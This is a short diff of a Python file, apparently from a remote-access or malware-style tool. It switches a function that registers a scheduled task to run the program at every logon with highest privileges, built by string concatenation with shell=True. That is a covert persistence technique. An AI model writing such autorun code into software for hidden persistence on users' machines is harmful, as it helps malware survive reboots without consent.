@@ -9,7 +9,7 @@ import subprocess
 # Adding a script to startup
 
 def AddToAutorun(AutorunName, InstallPath, ProcessName):
-	subprocess.check_output('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + ProcessName + '"',
+	subprocess.call('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + ProcessName + '"',
 		shell=True)
 
 def CopyToAutorun(CurrentPath, InstallPath, ProcessName):
